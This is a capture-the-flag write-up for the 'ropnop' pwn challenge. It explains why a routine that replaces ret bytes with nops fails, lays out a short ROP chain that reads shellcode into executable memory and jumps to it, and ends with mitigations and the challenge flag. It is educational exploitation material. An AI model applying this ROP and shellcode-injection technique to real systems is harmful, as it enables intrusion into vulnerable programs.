---
html:
  embed_local_images: true
  embed_svg: true
  offline: true
export_on_save:
  html: true
print_background: true
---
@import "../style.less"

# ropnop - localo


**Category:** Pwn       
**Difficulty:** Medium        
**Author:** Flo      

## Description
>heard about this spooky exploitation technique called ROP recently.
>
>These haxxors don't know who they're dealing with though. With ropnop™, I made sure that nobody can exploit my sketchy C code!
>
>Here's a demo:
>
>nc hax1.allesctf.net 9300

## Summery
Running the binary we get some output that says that all return between start and and are defused.
```
[defusing returns] start: 0x562cb92dc000 - end: 0x562cb92dd375
```
After that the program segfaults.

## Solution

<style>
.code0 .line-numbers-rows > span:nth-child(1){
	counter-reset: linenumber 40;
}

.code1 .line-numbers-rows > span:nth-child(1){
	counter-reset: linenumber 17;
}
.code2 .line-numbers-rows > span:nth-child(1){
	counter-reset: linenumber 26;
}

.ansi2html-content{
	background-color: transparent !important;
	padding: 0;
}
body > div > div{
	background-color: #323232;
	padding: 1em;
}
</style>
@import "ropnop.c" {as="c" class="line-numbers code0" line_begin=40 line_end=47}
The main function explains the segfault:
It reads 0x1337 bytes onto the stack (overwriting the return address) and returns.

But before that it calls `ropnop`
@import "ropnop.c" {as="c" class="line-numbers code2" line_begin=26 line_end=39}
This function maps the `.text` section as `Read/Write/Execute` and replaces every `ret` instruction (0xc3) with a `nop` (0x90).
The symbols `__executable_start` and `etext` are provided by the linker. But why does this function return? This is a quite hard bug to spot, but when replacing every `0xc3` with `0x90` it will replace the `0xc3` in the comparison as soon as the `ropnop` function is hit resulting in this code: 
```C
void ropnop() {
	unsigned char *start = &__executable_start;
	unsigned char *end = &etext;
	printf("[defusing returns] start: %p - end: %p\n", start, end);
	mprotect(start, end-start, PROT_READ|PROT_WRITE|PROT_EXEC);
	unsigned char *p = start;
	while (p != end) {
		// if we encounter a ret instruction, replace it with nop!
		if (*p == 0x90)
			*p = 0x90;
		p++;
	}
}
```
After this has happened the program will replace every `nop` with a `nop` and therefore do nothing. All `ret` instructions after this address will stay as they are. And the program will return to main.

@import "ropnop.c" {as="c" class="line-numbers code1" line_begin=17 line_end=25}
The program contains a function called `gadget_shop`. It contains nice ROP gadgets, but the `ropnop` function does overwrite the `ret` instructions, because the address is before the check. We can't use them for our chain.

But we can use all gadgets after the address of the `cmp ecx, 0xc3` (0x1270) here are the gadgets listed:
@import "gadgets.txt" {as="Python"}
The gadgets are quite powerful we could use `return-to-csu` to leak libc and do `pop rdi, ret; system` [instructions](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf), but as the `.text` section is already mapped `RWX`, I decided to just write my shellcode to it and jump into that. 
![](ropnop.png)

The ROP chain is very short:
```bash
__executable_start+0x60:	#rbp (junk)
__executable_start+0x1351:  pop rsi, pop r15, ret
__executable_start:			# rsi
0x00:						# r15
__executable_start+0x12ca	mov edx, 0x1337, call read, <junk>, add rsp, 0x20, pop rbp, ret # read 0x1337 bytes into __executable_start (our shellcode)
0x00 (0x20 times):			# padding for rsp
0x00:						# junk for pop rbp
__executable_start:			# jump to shellcode
```

```NASM
00000000000012a0 <main>:
    12a0:       55                      push   rbp
    12a1:       48 89 e5                mov    rbp,rsp
    12a4:       48 83 ec 20             sub    rsp,0x20
    12a8:       c7 45 fc 00 00 00 00    mov    DWORD PTR [rbp-0x4],0x0
    12af:       e8 bc fe ff ff          call   1170 <init_buffering>
    12b4:       e8 47 ff ff ff          call   1200 <ropnop>
    12b9:       31 ff                   xor    edi,edi
    12bb:       48 8d 45 f0             lea    rax,[rbp-0x10]
    12bf:       48 89 45 f0             mov    QWORD PTR [rbp-0x10],rax
    12c3:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
    12c7:       48 89 c6                mov    rsi,rax
    12ca:       ba 37 13 00 00          mov    edx,0x1337;  <-- we jump here
    12cf:       e8 6c fd ff ff          call   1040 <read@plt>
    12d4:       31 c9                   xor    ecx,ecx
    12d6:       48 89 45 e8             mov    QWORD PTR [rbp-0x18],rax
    12da:       89 c8                   mov    eax,ecx
    12dc:       48 83 c4 20             add    rsp,0x20
    12e0:       5d                      pop    rbp
    12e1:       c3                      ret
```

We can get the right offset for the overflow by using `cyclic_find`:
```shell
$ ./rop.py debug buffer_overflow
[...]
cyclic: 0x61616167
```
And we get the leak for free in the output the program.

@import "flag.txt" {as=shell}

## Code
@import "rop.py"

## Mitigation
- use stack cookies
- remap the memory as read only after the modification
- don't allow stack-overflows in your code

## Flag
CSCG{s3lf_m0d1fy1ng_c0dez!}